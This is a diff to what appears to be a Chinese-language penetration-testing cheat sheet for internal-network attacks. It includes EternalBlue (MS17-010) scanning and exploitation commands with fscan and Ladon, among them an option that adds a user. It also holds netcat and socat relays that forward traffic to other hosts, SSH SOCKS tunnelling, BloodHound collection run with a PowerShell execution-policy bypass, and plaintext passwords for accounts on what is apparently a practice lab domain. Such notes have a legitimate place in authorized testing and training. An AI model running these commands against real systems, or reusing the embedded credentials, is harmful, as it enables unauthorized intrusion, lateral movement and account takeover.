@@ -132,9 +132,10 @@ while :; do (nc -l -p 8888 -c "nc 192.168.19.153 22"); done
 Ladon.exe 192.168.50.153 MS17010
 # 多打几次
 fscan.exe -h 192.168.50.0/24 -m ms17010 -sc add
-# sysadm "1qaz@WSX!@#4"
+# sysadmin 1qaz@WSX!@#4
 
 ksmb 192.168.1.89
+# proxifier 添加 eternalblue.dat 
 # 3. https://www.freebuf.com/vuls/356052.html
 Eternalblue
 ```
@@ -649,6 +650,8 @@ ssh -f -N -D 127.0.0.1:1080 ubuntu@192.168.50.161 -p 2222
 有时不行换 frp
 
 ```shell
+# 让 0.0.0.0:80 转发到 127.0.0.1:79
+nohup socat TCP4-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &
 # 本地 1234 转发到 远程 4321
 socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
 # 本地 80 转发到远程 80
@@ -1033,6 +1036,8 @@ URL：neo4j://localhost:7687
 SharpHound.exe -c all # BloodHound\resources\app\Collectors\SharpHound.exe
 # 方式2
 powershell -exec bypass -command "Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all"
+# 方式3
+proxychains python3 bloodhound.py -u yangmei -p xrihGHgoNZQ -d xiaorang.lab --dns-tcp -ns 172.22.11.6 -c all --zip
 ```
 
 zip 压缩包的格式保存，拷贝到 BloodHound 主机上，右侧图标 Upload Data
